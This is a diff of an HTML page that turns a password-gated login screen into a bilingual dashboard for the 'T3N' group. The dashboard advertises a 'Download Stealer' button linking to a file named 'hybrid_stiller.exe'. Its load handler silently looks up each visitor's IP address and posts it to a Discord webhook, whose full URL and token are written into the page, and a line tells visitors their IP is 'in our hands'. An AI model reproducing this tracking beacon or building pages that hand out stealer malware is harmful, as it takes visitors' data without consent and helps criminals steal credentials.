@@ -1,206 +1,210 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>T3N Secret City</title>
-    <style>
-        body {
-            font-family: 'Courier New', Courier, monospace;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #0a0a0a;
-            color: #7a2fc2;
-        }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Dashboard | T3N</title>
 
-        .logo {
-            margin-bottom: 100px;
-            margin-top: -50px;
-            animation: spin 30s linear infinite;
-        }
+  <style>
+    :root {
+      --background-color: #0a0a0a;
+      --text-color: #7a2fc2;
+      --navbar-color: rgba(10, 10, 10, 0.95);
+      --box-background-color: rgba(10, 10, 10, 0.95);
+    }
 
-        .logo img {
-            width: 300px;
-            height: auto;
-            filter: drop-shadow(0 0 10px #7a2fc2);
-        }
+    body {
+      font-family: 'Courier New', Courier, monospace;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      background-color: var(--background-color);
+      color: var(--text-color);
+    }
 
-        @keyframes spin {
-            from {
-                transform: rotate(0deg);
-            }
-            to {
-                transform: rotate(360deg);
-            }
-        }
+    .navbar {
+      width: 100%;
+      background-color: var(--navbar-color);
+      padding: 15px 0;
+      display: flex;
+      align-items: center;
+      box-shadow: 0 4px 8px rgba(122, 47, 194, 0.3);
+      position: fixed;
+      top: 0;
+      z-index: 1000;
+    }
 
-        .login-box {
-            background-color: rgba(10, 10, 10, 0.95);
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 8px 16px rgba(122, 47, 194, 0.3);
-            width: 300px;
-            text-align: center;
-        }
+    .navbar img { margin-left: 20px; width: 75px; transition: transform 0.6s ease; }
+    .navbar img:hover { animation: spinGrowShrink 0.6s ease; }
 
-        .login-box h2 {
-            margin-bottom: 30px;
-            color: #7a2fc2;
-            font-size: 20px;
-        }
+    @keyframes spinGrowShrink {
+      0% { transform: rotate(0deg) scale(1); }
+      50% { transform: rotate(180deg) scale(1.3); }
+      100% { transform: rotate(360deg) scale(1); }
+    }
 
-        .login-box input[type="password"], .login-box input[type="text"] {
-            width: 100%;
-            padding: 10px;
-            margin: 30px 0;
-            border: 2px solid #7a2fc2;
-            border-radius: 6px;
-            font-size: 14px;
-            background-color: #0a0a0a;
-            color: #7a2fc2;
-        }
+    .navbar button {
+      background: linear-gradient(135deg, #7a2fc2, #5c1f96);
+      color: white; border: none; border-radius: 6px;
+      padding: 10px 20px; margin: 0 10px; font-size: 14px;
+      cursor: pointer; transition: 0.3s;
+    }
 
-        .login-box input::placeholder {
-            color: #5c1f96;
-        }
+    .navbar button:hover { transform: scale(1.05); }
 
-        .login-box button {
-            width: 100%;
-            padding: 10px;
-            background: linear-gradient(135deg, #7a2fc2, #5c1f96);
-            color: white;
-            border: none;
-            border-radius: 6px;
-            font-size: 16px;
-            cursor: pointer;
-            transition: transform 0.3s ease, background 0.3s ease;
-        }
+    .dashboard-box {
+      background-color: var(--box-background-color);
+      padding: 40px; border-radius: 15px;
+      box-shadow: 0 10px 20px rgba(122, 47, 194, 0.3);
+      text-align: center; width: 80%; max-width: 1000px;
+      margin-top: 150px; opacity: 0; transform: translateY(20px);
+      transition: all 0.5s ease;
+    }
 
-        .login-box button:disabled {
-            background: #444;
-            cursor: not-allowed;
-            transform: none;
-        }
+    .dashboard-box.show { opacity: 1; transform: translateY(0); }
 
-        .login-box button:hover:enabled {
-            background: linear-gradient(135deg, #5c1f96, #7a2fc2);
-            transform: scale(1.1);
-            box-shadow: 0 4px 12px rgba(122, 47, 194, 0.3);
-        }
+    .download-btn {
+      background: linear-gradient(135deg, #7a2fc2, #5c1f96);
+      color: white; border: none; border-radius: 6px;
+      padding: 15px 25px; font-size: 16px; cursor: pointer;
+      width: 200px; margin: 20px auto; display: block;
+    }
+    .download-btn:disabled { background: gray; cursor: not-allowed; }
 
-        .login-box #error-message {
-            color: #ff4d4d;
-            display: none;
-            margin-top: 10px;
-            font-size: 12px;
-            animation: showError 0.5s ease-out;
-        }
+    .dropdown { position: relative; display: inline-block; margin-top: 20px; }
+    .dropdown-content {
+      display: none; position: absolute; background: #0a0a0a;
+      border: 2px solid #7a2fc2; border-radius: 8px; min-width: 200px; z-index: 10;
+    }
+    .dropdown-content a { color: #7a2fc2; padding: 12px; text-decoration: none; display: block; }
+    .dropdown-content a:hover { background: #5c1f96; color: white; }
+    .dropdown:hover .dropdown-content { display: block; }
 
-        @keyframes showError {
-            0% {
-                opacity: 0;
-                transform: translateY(-10px);
-            }
-            100% {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
+    .eye-img { width: 150px; margin-top: 20px; }
 
-        .eye-icon {
-            position: absolute;
-            right: 10px;
-            top: 50%;
-            transform: translateY(-50%);
-            cursor: pointer;
-            font-size: 16px;
-            color: #7a2fc2;
-            transition: color 0.3s ease;
-        }
-
-        .eye-icon:hover {
-            color: #5c1f96;
-        }
-    </style>
+    @media (max-width: 768px) { .navbar { flex-direction: column; } .dashboard-box { margin-top: 250px; } }
+  </style>
 </head>
 <body>
-    <div class="logo">
-        <img src="logo.png" alt="Логотип">
-    </div>
 
-    <div class="login-box">
-        <h2>Введите пароль</h2>
-        <div style="position: relative;">
-            <input type="password" id="password" placeholder="Пароль" oninput="toggleButtonState()">
-            <span class="eye-icon" id="eye-icon" onclick="togglePassword()">👁️</span>
-        </div>
-        <button id="login-button" onclick="checkPassword()" disabled>Войти</button>
-        <p id="error-message" aria-live="assertive">Неверный пароль!</p>
-    </div>
+  <div class="navbar">
+    <a href="#"><img src="logo.png" alt="Logo" /></a>
+    <button onclick="navigateTo('home')">Main Menu</button>
+    <button onclick="window.location.href='https://bapehik721.github.io/-/best-site.html'">Alt Manager</button>
+    <button onclick="navigateTo('settings')">Settings</button>
+    <button onclick="navigateTo('download')">Download Stealer</button>
+    <button onclick="navigateTo('authors')">Authors</button>
+  </div>
 
-    <script>
-        const hashedPassword = "5a62862d9efea03073a411ccfb76f3ed856bb785fb52d0a376f0bc439e59049a";
+  <div class="dashboard-box show" id="dashboard-content">
+    <h1>Loading...</h1>
+  </div>
 
-        let attemptCount = 0;
-        const MAX_ATTEMPTS = 5;
-        const LOCKOUT_TIME = 50000; // 50 seconds
+  <script>
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1363500266363683007/dDMySRUCPEbmBvXgir9DYsqII64bjmZZQF95MGx_7gq2pQfCmNxdzT8kCIUHjYycsvQ0"; 
+    let currentLanguage = localStorage.getItem('language') || 'en';
 
-        async function checkPassword() {
-            const enteredPassword = document.getElementById("password").value;
-            const errorMessage = document.getElementById("error-message");
+    async function getUserIP() {
+        try {
+            const r = await fetch('https://api.ipify.org?format=json');
+            return (await r.json()).ip;
+        } catch { return 'Unknown'; }
+    }
 
-            // Prevent multiple attempts
-            if (attemptCount >= MAX_ATTEMPTS) {
-                errorMessage.textContent = "Слишком много неудачных попыток. Попробуйте через 50 секунд.";
-                errorMessage.style.display = "block";
-                setTimeout(() => {
-                    attemptCount = 0;
-                    errorMessage.style.display = "none";
-                }, LOCKOUT_TIME);
-                return;
-            }
-
-            const hash = await hashPassword(enteredPassword);
-
-            if (hash === hashedPassword) {
-                window.location.href = "dashboard eng128412418923791829821472198478921478217489217412489124791123213.html";
-            } else {
-                attemptCount++;
-                errorMessage.style.display = "block";
-            }
+    function updateContent() {
+        if (currentLanguage === 'ru') {
+            window.showHomePage = async () => {
+                const ip = await getUserIP();
+                document.getElementById("dashboard-content").innerHTML = `
+                    <h1>Добро Пожаловать На Главную Страницу T3N</h1>
+                    <p>Дата: ${new Date().toLocaleDateString()}</p>
+                    <p>Ваш IP: ${ip}</p>
+                    <p style="color: gray;">И помните: ваш IP уже в наших руках</p>
+                    <img src="ugrajauchi_glaz.png" class="eye-img">
+                `;
+            };
+            window.showDownloadPage = () => {
+                document.getElementById("dashboard-content").innerHTML = `
+                    <h1>Скачать Стиллер</h1>
+                    <button class="download-btn" id="dl-btn" disabled>Скачать</button>
+                    <div class="dropdown">
+                        <button class="download-btn">Выберите версию</button>
+                        <div class="dropdown-content">
+                            <a href="#" onclick="setVer('Hybrid')">Hybrid</a>
+                            <a href="#" style="color:gray">Rage (Locked)</a>
+                        </div>
+                    </div>
+                `;
+            };
+            window.showAuthorsPage = () => {
+                document.getElementById("dashboard-content").innerHTML = `
+                    <h1>Авторы</h1>
+                    <p>cif3rbl4t & varenik721</p>
+                    <p>GitHub Copilot & ChatGPT (рабы кода)</p>
+                `;
+            };
+        } else {
+            // Английская версия (аналогично)
+            window.showHomePage = async () => {
+                const ip = await getUserIP();
+                document.getElementById("dashboard-content").innerHTML = `
+                    <h1>Welcome to T3N</h1>
+                    <p>IP: ${ip}</p>
+                    <img src="ugrajauchi_glaz.png" class="eye-img">
+                `;
+            };
+            window.showDownloadPage = () => {
+                document.getElementById("dashboard-content").innerHTML = `<h1>Download</h1><button class="download-btn" disabled id="dl-btn">Download</button>`;
+            };
+            window.showAuthorsPage = () => {
+                document.getElementById("dashboard-content").innerHTML = `<h1>Authors</h1><p>cif3rbl4t & varenik721</p>`;
+            };
         }
 
-        async function hashPassword(password) {
-            const encoder = new TextEncoder();
-            const data = encoder.encode(password);
-            const hashBuffer = await crypto.subtle.digest("SHA-256", data);
-            const hashArray = Array.from(new Uint8Array(hashBuffer));
-            return hashArray.map(byte => byte.toString(16).padStart(2, "0")).join("");
-        }
+        window.showSettingsPage = () => {
+            document.getElementById("dashboard-content").innerHTML = `
+                <h1>Settings</h1>
+                <select onchange="localStorage.setItem('language', this.value); location.reload();">
+                    <option value="en" ${currentLanguage==='en'?'selected':''}>English</option>
+                    <option value="ru" ${currentLanguage==='ru'?'selected':''}>Русский</option>
+                </select>
+            `;
+        };
 
-        function togglePassword() {
-            const passwordField = document.getElementById("password");
-            const eyeIcon = document.getElementById("eye-icon");
+        navigateTo('home');
+    }
 
-            if (passwordField.type === "password") {
-                passwordField.type = "text";
-                eyeIcon.textContent = "🙈";
-            } else {
-                passwordField.type = "password";
-                eyeIcon.textContent = "👁️";
-            }
-        }
+    function setVer(v) {
+        const btn = document.getElementById('dl-btn');
+        btn.disabled = false;
+        btn.innerText = `Download ${v}`;
+        btn.onclick = () => window.location.href = 'hybrid_stiller.exe';
+    }
 
-        function toggleButtonState() {
-            const passwordField = document.getElementById("password");
-            const loginButton = document.getElementById("login-button");
+    function navigateTo(page) {
+      const content = document.getElementById("dashboard-content");
+      content.classList.remove("show");
+      setTimeout(() => {
+        if (page === "home") showHomePage();
+        else if (page === "settings") showSettingsPage();
+        else if (page === "download") showDownloadPage();
+        else if (page === "authors") showAuthorsPage();
+        setTimeout(() => content.classList.add("show"), 50);
+      }, 300);
+    }
 
-            loginButton.disabled = passwordField.value.trim() === "";
-        }
-    </script>
+    document.addEventListener("DOMContentLoaded", () => {
+        updateContent();
+        getUserIP().then(ip => {
+            fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({content: `User IP: ${ip}`})
+            });
+        });
+    });
+  </script>
 </body>
 </html>
